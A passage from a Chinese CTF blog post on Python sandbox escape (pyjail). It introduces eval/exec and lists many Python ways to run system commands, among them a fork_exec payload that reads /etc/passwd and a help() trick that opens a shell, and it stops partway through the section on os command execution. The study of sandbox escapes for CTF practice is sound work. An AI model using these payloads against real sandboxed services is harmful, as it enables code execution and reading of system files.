
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>Python Jail Re:Master | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#eval-%E4%B8%8E-exec"><span class="toc-number">2.</span> <span class="toc-text">eval 与 exec</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Python-%E5%90%84%E7%A7%8D%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">Python 各种系统命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#os-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.</span> <span class="toc-text">os 命令执行</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#import"><span class="toc-number">4.</span> <span class="toc-text">import</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C"><span class="toc-number">5.</span> <span class="toc-text">字符串操作</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97"><span class="toc-number">6.</span> <span class="toc-text">核心模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sys-modules"><span class="toc-number">6.1.</span> <span class="toc-text">sys.modules</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#del-%E9%87%8D%E8%BD%BD"><span class="toc-number">6.1.1.</span> <span class="toc-text">del 重载</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#builtins"><span class="toc-number">6.2.</span> <span class="toc-text">builtins</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reload-%E9%87%8D%E8%BD%BD"><span class="toc-number">6.2.1.</span> <span class="toc-text">reload 重载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E9%93%BE%E7%BB%95%E8%BF%87-no-builtins"><span class="toc-number">6.2.2.</span> <span class="toc-text">继承链绕过 no builtins</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Audit-Hook"><span class="toc-number">7.</span> <span class="toc-text">Audit Hook</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8"><span class="toc-number">8.</span> <span class="toc-text">沙盒逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E5%B8%A7"><span class="toc-number">8.1.</span> <span class="toc-text">栈帧</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gc"><span class="toc-number">8.2.</span> <span class="toc-text">gc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">9.</span> <span class="toc-text">实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#beginner"><span class="toc-number">9.1.</span> <span class="toc-text">beginner</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python2-input-JAIL"><span class="toc-number">9.2.</span> <span class="toc-text">python2 input(JAIL)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">9.3.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">9.4.</span> <span class="toc-text">level 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2-5"><span class="toc-number">9.5.</span> <span class="toc-text">level 2.5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">9.6.</span> <span class="toc-text">level 3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lake-lake-lake"><span class="toc-number">9.7.</span> <span class="toc-text">lake lake lake</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#l-ke-l-ke-l-ke"><span class="toc-number">9.8.</span> <span class="toc-text">l@ke l@ke l@ke</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#laKe-laKe-laKe"><span class="toc-number">9.9.</span> <span class="toc-text">laKe laKe laKe</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%AF%AD%E5%8F%A5%E6%89%A7%E8%A1%8C"><span class="toc-number">9.9.1.</span> <span class="toc-text">多语句执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E7%94%9F%E6%88%90%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B9%8B%E5%89%8D%E7%9A%84%E7%8A%B6%E6%80%81"><span class="toc-number">9.9.2.</span> <span class="toc-text">恢复生成随机数之前的状态</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952%EF%BC%9A"><span class="toc-number">9.9.3.</span> <span class="toc-text">法2：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lak3-lak3-lak3"><span class="toc-number">9.10.</span> <span class="toc-text">lak3 lak3 lak3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">9.11.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bytes%E7%9A%84ASCII-list%E5%88%9D%E5%A7%8B%E5%8C%96%E6%96%B9%E5%BC%8F"><span class="toc-number">9.11.1.</span> <span class="toc-text">bytes的ASCII list初始化方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4-0-5"><span class="toc-number">9.12.</span> <span class="toc-text">level 4.0.5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4-1"><span class="toc-number">9.13.</span> <span class="toc-text">level 4.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#doc-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%8E%B7%E5%8F%96%E5%AD%97%E7%AC%A6"><span class="toc-number">9.13.1.</span> <span class="toc-text">__doc__魔术方法获取字符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI-getshell"><span class="toc-number">9.13.2.</span> <span class="toc-text">SSTI getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4-2"><span class="toc-number">9.14.</span> <span class="toc-text">level 4.2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952%EF%BC%9Ajoin%E6%8B%BC%E6%8E%A5"><span class="toc-number">9.14.1.</span> <span class="toc-text">法2：join拼接</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4-3"><span class="toc-number">9.15.</span> <span class="toc-text">level 4.3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">9.16.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952%EF%BC%9A%E4%B8%80%E5%8F%A5%E8%AF%9DRCE%E4%B8%80%E6%8A%8A%E6%A2%AD"><span class="toc-number">9.16.1.</span> <span class="toc-text">法2：一句话RCE一把梭</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5-1"><span class="toc-number">9.17.</span> <span class="toc-text">level 5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%952%EF%BC%9ASSTI-getshell"><span class="toc-number">9.17.1.</span> <span class="toc-text">法2：SSTI getshell</span></a></li></ol></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>Python Jail Re:Master</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/6/7
        </span>
        
        <span class="category">
            <a href="/blog/categories/%E6%9D%82%E9%A1%B9/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                杂项
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/%E6%B2%99%E7%9B%92/" style="color: #00bcd4">沙盒</a>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/python/" style="color: #00bcd4">python</a>
            </span>
            
        </span>
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">9.8k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">48分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>python沙箱逃逸（pyjail），在这些题目中，我们往往能够交互式地用 <code>eval</code> 或者 <code>exec</code> 执行 python 代码，在这个基础上，添加各种限制，即为 jail</p>
<p>基础知识可以看<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578966149">春哥的文章</a></p>
<p>实战部分结合空白爷在 HNCTF 出的题目来学习</p>
<p>两年后回望，只能说想要把 SSTI、Pickle 等 python 相关的题目玩明白，必须要有 PyJail 打好基础</p>
<p>或许它真能改变 pyjail：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LAMENTXU/articles/19101758">https://www.cnblogs.com/LAMENTXU/articles/19101758</a></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/">https://www.tr0y.wang/2019/05/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</a></p>
<p><a target="_blank" rel="noopener" href="https://dummykitty.github.io/posts/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/">https://dummykitty.github.io/posts/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86/</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/1990">https://xz.aliyun.com/news/1990</a></p>
<span id="more"></span>

<hr>
<h1 id="eval-与-exec"><a href="#eval-与-exec" class="headerlink" title="eval 与 exec"></a>eval 与 exec</h1><p>这两个方法无论在任何语言里都是相当危险的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
<span class="token comment"># source (str | code object) -- 一个 Python 表达式。</span>
<span class="token comment"># globals (dict | None) -- 全局命名空间 (默认值: None)。</span>
<span class="token comment"># locals (mapping | None) -- 局部命名空间 (默认值: None)。</span>

<span class="token keyword">exec</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token operator">/</span><span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token builtin">locals</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">,</span> closure<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>这里 exec 比 eval 还更具影响一点，后者不支持直接执行多行代码，需要使用 compile 函数并传入 exec 模式</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">'__import__("os").system("ls")'</span><span class="token punctuation">,</span> <span class="token string">'&lt;string>'</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="Python-各种系统命令执行"><a href="#Python-各种系统命令执行" class="headerlink" title="Python 各种系统命令执行"></a>Python 各种系统命令执行</h1><p>以下均需要 import 相应的库</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">os

commands	<span class="token comment"># python2</span>


subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
subprocess<span class="token punctuation">.</span>getoutput<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
subprocess<span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>
subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>	<span class="token comment"># py2，py3</span>
subprocess<span class="token punctuation">.</span>check_call<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>	<span class="token comment"># py2，py3</span>
subprocess<span class="token punctuation">.</span>check_output<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>	<span class="token comment"># py2，py3</span>
subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>	<span class="token comment"># py2，py3</span>

timeit<span class="token punctuation">.</span>sys
timeit<span class="token punctuation">.</span>timeit<span class="token punctuation">(</span><span class="token string">"__import__('os').system('whoami')"</span><span class="token punctuation">,</span> number<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>

platform<span class="token punctuation">.</span>os
platform<span class="token punctuation">.</span>sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
platform<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span> bufsize<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>	<span class="token comment"># 仅linux</span>
pty<span class="token punctuation">.</span>os

importlib<span class="token punctuation">.</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>	<span class="token comment"># 仅py3</span>

sys<span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span>

ctypes<span class="token punctuation">.</span>CDLL<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'multiprocessing'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>

_posixsubprocess<span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>	<span class="token comment"># 不同系统之间的参数数量有差异</span>
__loader__<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">'_posixsubprocess'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>fork_exec<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">,</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">b"/bin/cat"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>__loader__<span class="token punctuation">.</span>load_module<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pipe<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span><span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">)</span>

bdb<span class="token punctuation">.</span>os

cgi<span class="token punctuation">.</span>os
cgi<span class="token punctuation">.</span>sys

<span class="token comment"># 仅交互式shell可用</span>
<span class="token builtin">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>	
<span class="token builtin">help</span><span class="token operator">></span> os
!sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="os-命令执行"><a href="#os-命令执行" class="headerlink" title="os 命令执行"></a>os 命令执行</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen2<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x  </span>
<span class="token keyword">print</span><span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen3<span class="token punctuation">(</span><span class="token string">'whoami'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 2.x  </span>
